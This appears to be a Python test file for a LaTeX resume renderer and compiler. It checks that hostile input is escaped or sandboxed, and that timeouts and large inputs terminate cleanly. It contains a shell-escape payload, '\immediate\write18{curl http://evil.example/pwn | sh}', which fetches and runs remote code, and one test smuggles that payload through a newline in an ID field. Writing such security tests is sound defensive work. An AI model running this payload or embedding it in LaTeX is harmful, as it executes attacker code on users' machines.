import time
from pathlib import Path

from core.schemas import Fact
from latex.compile import compile_tex
from latex.render import render_tex

SHELL_ESCAPE_PAYLOAD = r"\immediate\write18{curl http://evil.example/pwn | sh}"


def test_shell_escape_payload_is_neutralized_by_escaping(master):
    master.experiences[0].facts[0] = Fact(id="BAB-01", text=SHELL_ESCAPE_PAYLOAD)
    tex = render_tex(master, None)
    assert r"\write18" not in tex.replace(r"\textbackslash{}write18", "")
    assert r"\textbackslash{}immediate\textbackslash{}write18" in tex


def test_newline_in_fact_id_cannot_break_out_of_comment(master):
    # a % comment runs to end-of-line: a newline smuggled into an id must not
    # terminate the receipt and leak the rest into the document body
    master.experiences[0].facts[0] = Fact(
        id="GA-01\n" + SHELL_ESCAPE_PAYLOAD, text="Legit bullet text"
    )
    tex = render_tex(master, None)
    assert r"\write18" not in tex.replace(r"\textbackslash{}write18", "")
    receipt_lines = [line for line in tex.splitlines() if "% grounded: GA-01" in line]
    assert len(receipt_lines) == 1
    assert "write18" in receipt_lines[0], "smuggled newline split the receipt comment"


def test_raw_write18_compile_does_not_execute(tmp_path):
    marker = tmp_path / "pwned"
    doc = (
        r"\documentclass{article}\begin{document}"
        rf"\immediate\write18{{touch {marker}}}"
        r"hello\end{document}"
    )
    pdf_path, log = compile_tex(doc, output_dir=tmp_path, timeout_s=60)
    assert not marker.exists(), "shell-escape executed despite --untrusted!"


def test_infinite_loop_hits_timeout(tmp_path):
    doc = (
        r"\documentclass{article}"
        r"\newcommand{\loopforever}{\loopforever}"
        r"\begin{document}\loopforever\end{document}"
    )
    start = time.time()
    pdf_path, log = compile_tex(doc, output_dir=tmp_path, timeout_s=5)
    elapsed = time.time() - start
    assert pdf_path == ""
    assert elapsed < 15, f"timeout not enforced, took {elapsed:.1f}s"
    # either our subprocess timeout fired or TeX's own recursion guard tripped;
    # both must surface an explanatory log
    assert log


def test_absurdly_long_fact(master, tmp_path):
    master.experiences[0].facts[0] = Fact(id="BAB-01", text="A" * 200_000)
    tex = render_tex(master, None)
    pdf_path, log = compile_tex(tex, output_dir=tmp_path, timeout_s=30)
    # must terminate cleanly either way: a PDF or a surfaced error
    if pdf_path:
        assert Path(pdf_path).exists()
    else:
        assert log


def test_hundreds_of_entries(master, tmp_path):
    exp = master.experiences[0]
    master.experiences = [
        exp.model_copy(update={"id": f"exp{i}"}) for i in range(300)
    ]
    tex = render_tex(master, None)
    pdf_path, log = compile_tex(tex, output_dir=tmp_path, timeout_s=30)
    if pdf_path:
        assert Path(pdf_path).exists()
    else:
        assert log
